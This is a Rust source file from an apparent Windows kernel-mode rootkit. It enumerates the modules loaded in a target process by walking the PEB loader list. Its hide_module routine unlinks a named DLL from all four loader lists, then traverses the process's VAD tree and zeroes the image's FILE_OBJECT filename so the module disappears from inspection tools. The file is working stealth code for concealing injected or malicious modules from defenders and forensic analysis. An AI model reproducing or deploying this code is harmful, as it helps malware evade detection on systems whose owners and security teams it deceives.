use {
    wdk_sys::*,
    alloc::vec::Vec,
    winapi::shared::ntdef::LIST_ENTRY,
    ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
};

use crate::{
    process::Process,
    error::ShadowError, 
    data::{
        MMVAD_SHORT, MMVAD, 
        PsGetProcessPeb
    }, 
    offsets::get_vad_root,
    utils::process_attach::ProcessAttach
};

#[derive(Debug)]
pub struct ModuleInfo {
    pub name: [u16; 256],
    pub address: usize,
    pub index: u8,
}

/// Represents a module in the operating system.
pub struct Module;

impl Module {

    /// VAD Type for an image map.
    const VAD_IMAGE_MAP: u32 = 2;

    /// Enumerates modules in a given target process.
    /// 
    /// # Arguments
    /// 
    /// * `process` - A pointer to the target process (`*mut TargetProcess`) from which the modules will be enumerated.
    /// * `module_info` - A pointer to a `ModuleInfo` structure that will be populated with information about the enumerated modules.
    /// * `information` - A mutable reference to a `usize` that will store additional information about the module enumeration.
    ///
    /// # Returns
    /// 
    /// * `NTSTATUS` - Returns `STATUS_SUCCESS` if the module enumeration is successful, otherwise returns an appropriate error status.
    pub unsafe fn enumerate_module(pid: usize) -> Result<Vec<ModuleInfo>, ShadowError> {
        let mut modules: Vec<ModuleInfo> = Vec::with_capacity(276);

        // Attaches the target process to the current context
        let target = Process::new(pid)?;
        let mut attach_process = ProcessAttach::new(target.e_process);

        // Gets the PEB (Process Environment Block) of the target process
        let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
        if target_peb.is_null() || (*target_peb).Ldr.is_null() {
            return Err(ShadowError::FunctionExecutionFailed("PsGetProcessPeb", line!()));
        }

        // Enumerates the loaded modules from the InLoadOrderModuleList
        let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
        let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;
        let mut count = 0;         

        while next != current  {
            if next.is_null() {
                return Err(ShadowError::NullPointer("LIST_ENTRY"));
            }

            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            if list_entry.is_null() {
                return Err(ShadowError::NullPointer("LDR_DATA_TABLE_ENTRY"));
            }

            // Get the module name from the `FullDllName` field, converting it from UTF-16 to a Rust string
            let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
            if buffer.is_empty() {
                return Err(ShadowError::StringConversionFailed((*list_entry).FullDllName.Buffer as usize));
            }

            let mut name = [0u16; 256];
            let length = core::cmp::min(buffer.len(), 255);
            name[..length].copy_from_slice(&buffer[..length]);

            // Populates the `ModuleInfo` structure with name, address, and index
            modules.push(ModuleInfo {
                name,
                address: (*list_entry).DllBase as usize,
                index: count as u8,
            });
            
            count += 1;
    
            // Move to the next module in the list
            next = (*next).Flink;
        }

        // Detaches the target process
        attach_process.detach();

        Ok(modules)
    }

    /// Hides a module in a target process by removing its entries from the module list.
    ///
    /// # Arguments
    /// 
    /// * `target` - A pointer to a `TargetModule` structure containing information about the module to be hidden.
    ///
    /// # Returns
    /// 
    /// * `Ok(NTSTATUS)` - If the module is successfully hidden.
    /// * `Err(ShadowError)` - If an error occurs when trying to hide the module.
    pub unsafe fn hide_module(pid: usize, module_name: &str) -> Result<NTSTATUS, ShadowError> {
        let target = Process::new(pid)?;
        let mut attach_process = ProcessAttach::new(target.e_process);

        let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
        if target_peb.is_null() || (*target_peb).Ldr.is_null() {
            return Err(ShadowError::FunctionExecutionFailed("PsGetProcessPeb", line!()));
        }
        
        let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
        let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;
        let mut address = core::ptr::null_mut();

        while next != current {
            if next.is_null() {
                return Err(ShadowError::NullPointer("next LIST_ENTRY"));
            }

            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            if list_entry.is_null() {
                return Err(ShadowError::NullPointer("next LDR_DATA_TABLE_ENTRY"));
            }

            let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
            if buffer.is_empty() {
                return Err(ShadowError::StringConversionFailed((*list_entry).FullDllName.Buffer as usize));
            }

            // Check if the module name matches
            let dll_name = alloc::string::String::from_utf16_lossy(buffer);
            if dll_name.to_lowercase() == module_name.to_lowercase() {
                
                // Removes the module from the load order list
                Self::remove_link(&mut (*list_entry).InLoadOrderLinks);
                Self::remove_link(&mut (*list_entry).InMemoryOrderLinks);
                Self::remove_link(&mut (*list_entry).u1.InInitializationOrderLinks);
                Self::remove_link(&mut (*list_entry).HashLinks);
                address = (*list_entry).DllBase;
                break;
            }
    
            next = (*next).Flink;
        }
    
        // Detaches the target process
        attach_process.detach();

        if !address.is_null() {
            Self::hide_object(address as u64, target);
        }

        Ok(STATUS_SUCCESS)
    }

    /// Removing the module name in the FILE_OBJECT structure.
    ///
    /// # Arguments
    /// 
    /// * `target_address` - The address of the module to hide.
    /// * `process` - The target process structure.
    ///
    /// # Returns
    /// 
    /// * `NTSTATUS` - Returns `STATUS_SUCCESS` if the VAD is successfully hidden, otherwise returns an appropriate error status.
    pub unsafe fn hide_object(target_address: u64, process: Process) -> Result<(), NTSTATUS> {
        let vad_root = get_vad_root();
        let vad_table = process.e_process.cast::<u8>().offset(vad_root as isize) as *mut RTL_BALANCED_NODE;

        // Uses a stack to iteratively traverse the tree
        let mut stack = alloc::vec![vad_table];
        while let Some(current_node) = stack.pop() {
            if current_node.is_null() {
                continue;
            }

            // Converts the current node to an MMVAD_SHORT
            let vad_short = current_node as *mut MMVAD_SHORT;

            // Calculates start and end addresses
            let mut start_address = (*vad_short).StartingVpn as u64;
            let mut end_address = (*vad_short).EndingVpn as u64;

            // Uses StartingVpnHigh and EndingVpnHigh to assemble the complete address
            start_address |= ((*vad_short).StartingVpnHigh as u64) << 32;
            end_address |= ((*vad_short).EndingVpnHigh as u64) << 32;

            // Multiply the addresses by 0x1000 (page size) to get the real addresses
            let start_address = start_address * 0x1000;
            let end_address = end_address * 0x1000;

            if (*vad_short).u.VadFlags.VadType() == Self::VAD_IMAGE_MAP && target_address >= start_address && target_address <= end_address {
                let long_node = vad_short as *mut MMVAD;

                let subsection = (*long_node).SubSection;
                if subsection.is_null() || (*subsection).ControlArea.is_null() || (*(*subsection).ControlArea).FilePointer.Inner.Object.is_null() {
                    return Err(STATUS_INVALID_ADDRESS);
                }

                let file_object = ((*(*subsection).ControlArea).FilePointer.Inner.Value & !0xF) as *mut FILE_OBJECT;
                core::ptr::write_bytes((*file_object).FileName.Buffer, 0, (*file_object).FileName.Length as usize);
                break;
            }

            // Stack the right node (if there is one)
            if !(*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Right.is_null() {
                stack.push((*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Right);
            }

            // Stack the left node (if there is one)
            if !(*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Left.is_null() {
                stack.push((*vad_short).VadNode.__bindgen_anon_1.__bindgen_anon_1.Left);
            }
        }

        Ok(())
    }

    /// Removes a link from the list.
    ///
    /// # Arguments
    /// 
    /// * `list` - A mutable reference to the `LIST_ENTRY` structure to unlink.
    unsafe fn remove_link(list: &mut LIST_ENTRY) {
        let next = list.Flink;
        let previous = list.Blink;
    
        (*next).Blink = previous;
        (*previous).Flink = next;
    
        list.Flink = list;
        list.Blink = list;
    }
}
